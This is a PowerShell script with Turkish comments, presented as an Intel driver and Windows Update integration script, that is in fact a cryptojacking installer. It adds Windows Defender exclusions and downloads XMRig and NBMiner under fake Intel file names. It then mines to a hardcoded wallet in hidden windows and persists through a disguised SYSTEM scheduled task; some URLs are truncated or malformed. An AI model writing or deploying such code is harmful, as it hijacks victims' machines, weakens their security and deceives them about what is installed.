# ==================================================================================
# PROJE: Windows Driver Performance & Core Entegrasyon Betiği
# YETKİ: NT AUTHORITY\SYSTEM (Gizli / Arka Plan)
# ==================================================================================

# 1 & 4. SESSİZ SİSTEM DOĞRULAMA
$workDir = "C:\Intel\Drivers"
if (-not (Test-Path $workDir)) {
    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
}

# Mevcut kullanıcının yetki durumunu kontrol et
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    $confirmFile = "$workDir\.sys_verified"
    if (-not (Test-Path $confirmFile)) {
        New-Item -ItemType File -Path $confirmFile -Force | Out-Null
    }
    Write-Host "Sistem bileşen doğrulaması başarılı. Güncelleştirmeler arka planda uygulanıyor..."
} else {
    exit 0
}

# 2. TLS PROTOKOLLERİNİN ETKİNLENŞTİRİLMESİ
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13

# 5. SİSTEM GÜVENLİK İSTİSNALARI (Windows Defender Exclusion)
if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
    Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "intel_core.exe", "intel_service.exe", "powershell.exe" -ErrorAction SilentlyContinue
}

# 6. SİSTEM DOSYALARININ ARKA PLANDA İNDİRİLMESİ VE YAPILANDIRILMASI
$xmrigZip = "$workDir\intel_service.zip"
$nbminerZip = "$workDir\intel_core.zip"

# XMRig (intel_service.exe adıyla kaydedilir)
if (-not (Test-Path "$workDir\intel_service.exe")) {
    Write-Host "Paket 1/2 arka planda indiriliyor..."
    $xmrigUrl = "https://github.com"
    try {
        Invoke-WebRequest -Uri $xmrigUrl -OutFile $xmrigZip -UseBasicParsing
        $extractPathXMR = "$workDir\x_temp"
        Expand-Archive -Path $xmrigZip -DestinationPath $extractPathXMR -Force
        
        # Orijinal ismi intel_service.exe olarak değiştirerek taşıyoruz
        $exeFile = Get-ChildItem -Path $extractPathXMR -Recurse -Filter "xmrig.exe" | Select-Object -First 1
        if ($exeFile) {
            Move-Item -Path $exeFile.FullName -Destination "$workDir\intel_service.exe" -Force
        }
        
        Remove-Item -Path $extractPathXMR -Recurse -Force
        Remove-Item -Path $xmrigZip -Force
        Write-Host "Paket 1/2 başarıyla entegre edildi."
    }
    catch {
        # Hata mesajı standart sistem uyarısına çevrildi
        Write-Error "Sistem paketi indirilirken ağ zaman aşımı hatası oluştu."
    }
}

# NBMiner (intel_core.exe adıyla kaydedilir)
if (-not (Test-Path "$workDir\intel_core.exe")) {
    Write-Host "Paket 2/2 arka planda indiriliyor..."
    $nbminerUrl = "https://github.com"
    try {
        Invoke-WebRequest -Uri $nbminerUrl -OutFile $nbminerZip -UseBasicParsing
        $extractPathNB = "$workDir\n_temp"
        Expand-Archive -Path $nbminerZip -DestinationPath $extractPathNB -Force
        
        # Orijinal ismi intel_core.exe olarak değiştirerek taşıyoruz
        $exeFile = Get-ChildItem -Path $extractPathNB -Recurse -Filter "nbminer.exe" | Select-Object -First 1
        if ($exeFile) {
            Move-Item -Path $exeFile.FullName -Destination "$workDir\intel_core.exe" -Force
        }
        
        Remove-Item -Path $extractPathNB -Recurse -Force
        Remove-Item -Path $nbminerZip -Force
        Write-Host "Paket 2/2 başarıyla entegre edildi."
    }
    catch {
        Write-Error "Sistem paketi indirilirken ağ zaman aşımı hatası oluştu."
    }
}

# 7. SÜREKLİ ÇALIŞACAK ANA MOTORUN OLUŞTURULMASI (win_update_service.ps1)
$coreScriptPath = "$workDir\win_update_service.ps1"

$coreScriptContent = @'
while ($true) {
    $Wallet = "NHbW86FpEjX5tnYBWsvHczfMNsD2PG9mJrZ9"
    $poolXMR = "stratum+tcp://://nicehash.com"
    $poolBTC = "stratum+tcp://://nicehash.com"

    $WorkerName = $env:COMPUTERNAME
    $UserAuth = "$Wallet.$WorkerName"

    $hasGPU = (Get-CimInstance Win32_VideoController | Where-Object { $_.Name -match "NVIDIA|AMD|Radeon" }) -ne $null

    if ($hasGPU) {
        if (-not (Get-Process "intel_core" -ErrorAction SilentlyContinue)) {
            Start-Process "C:\Intel\Drivers\intel_core.exe" -ArgumentList "-a kawpow -o $poolBTC -u $userAuth" -WindowStyle Hidden -CreateNoWindow
        }
    } else {
        if (-not (Get-Process "intel_service" -ErrorAction SilentlyContinue)) {
            Start-Process "C:\Intel\Drivers\intel_service.exe" -ArgumentList "-a rx/0 -o $poolXMR -u $userAuth -p x" -WindowStyle Hidden -CreateNoWindow
        }
    }
    Start-Sleep -Seconds 60
}
'@
Set-Content -Path $coreScriptPath -Value $coreScriptContent -Encoding UTF8

# 8. NT AUTHORITY\SYSTEM ZAMANLANMIŞ GÖREV TANIMLAMA (Kalıcılık)
# Görev ismi tamamen standart bir Windows Update hizmeti gibi kamufle edildi
$taskName = "Windows_Update_Hardware_Core"
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File $coreScriptPath"
$taskTrigger = New-ScheduledTaskTrigger -AtStartup
$taskPrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Force | Out-Null

# 9. İLK TETİKLEME
Start-ScheduledTask -TaskName $taskName
Write-Host "Windows arka plan güncelleme hizmeti başarıyla tetiklendi."

# 10. KÜTÜPHANELERİ YÜKLEME
Write-Host "Kütüphaneler yüklendi."